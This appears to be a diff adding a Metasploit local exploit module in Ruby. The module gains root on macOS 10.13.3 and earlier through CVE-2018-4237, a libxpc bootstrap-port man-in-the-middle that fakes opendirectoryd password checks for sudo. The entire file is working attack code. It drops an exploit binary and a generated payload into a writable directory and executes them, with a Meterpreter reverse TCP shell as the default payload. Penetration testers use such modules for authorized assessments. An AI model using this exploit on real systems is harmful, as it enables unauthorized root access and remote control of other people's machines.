@@ -1,0 +1,87 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Local
+  Rank = ExcellentRanking
+
+  include Msf::Post::File
+  include Msf::Post::OSX::Priv
+  include Msf::Post::OSX::System
+  include Msf::Exploit::EXE
+  include Msf::Exploit::FileDropper
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'          => 'Mac OS X libxpc MITM Privilege Escalation',
+      'Description'   => %q{
+        This module exploits a vulnerablity in libxpc on macOS <= 10.13.3
+        The task_set_special_port API allows callers to overwrite their bootstrap port,
+        which is used to communicate with launchd. This port is inherited across forks:
+        child processes will use the same bootstrap port as the parent.
+        By overwriting the bootstrap port and forking a child processes, we can now gain
+        a MitM position between our child and launchd.
+
+        To gain root we target the sudo binary and intercept its communication with
+        opendirectoryd, which is used by sudo to verify credentials. We modify the
+        replies from opendirectoryd to make it look like our password was valid.
+      },
+      'License'       => MSF_LICENSE,
+      'Author'         => [ 'saelo' ],
+      'References'     => [
+          ['CVE', '2018-4237'],
+          ['URL', 'https://github.com/saelo/pwn2own2018'],
+        ],
+      'Arch'           => [ ARCH_X64 ],
+      'Platform'       => 'osx',
+      'DefaultTarget'  => 0,
+      'DefaultOptions' => { 'PAYLOAD' => 'osx/x64/meterpreter/reverse_tcp' },
+      'Targets'        => [
+          [ 'Mac OS X x64 (Native Payload)', { } ]
+        ],
+      'DisclosureDate' => 'Mar 15 2018'))
+    register_advanced_options [
+      OptString.new('WritableDir', [ true, 'A directory where we can write files', '/tmp' ])
+    ]
+  end
+
+  def upload_executable_file(filepath, filedata)
+    print_status("Uploading file: '#{filepath}'")
+    write_file(filepath, filedata)
+    chmod(filepath)
+    register_file_for_cleanup(filepath)
+  end
+
+  def check
+    version = Gem::Version.new(get_system_version)
+    if version >= Gem::Version.new('10.13.4')
+      CheckCode::Safe
+    else
+      CheckCode::Appears
+    end
+  end
+
+  def exploit
+    if check != CheckCode::Appears
+      fail_with Failure::NotVulnerable, 'Target is not vulnerable'
+    end
+
+    if is_root?
+      fail_with Failure::BadConfig, 'Session already has root privileges'
+    end
+
+    unless writable? datastore['WritableDir']
+      fail_with Failure::BadConfig, "#{datastore['WritableDir']} is not writable"
+    end
+
+    exploit_data = File.binread(File.join(Msf::Config.data_directory, "exploits", "CVE-2018-4237", "ssudo" ))
+    exploit_file = "#{datastore['WritableDir']}/#{Rex::Text::rand_text_alpha_lower(6..12)}"
+    upload_executable_file(exploit_file, exploit_data)
+    payload_file = "#{datastore['WritableDir']}/#{Rex::Text::rand_text_alpha_lower(6..12)}"
+    upload_executable_file(payload_file, generate_payload_exe)
+    exploit_cmd = "#{exploit_file} #{payload_file}"
+    print_status("Executing cmd '#{exploit_cmd}'")
+    cmd_exec(exploit_cmd)
+  end
+end
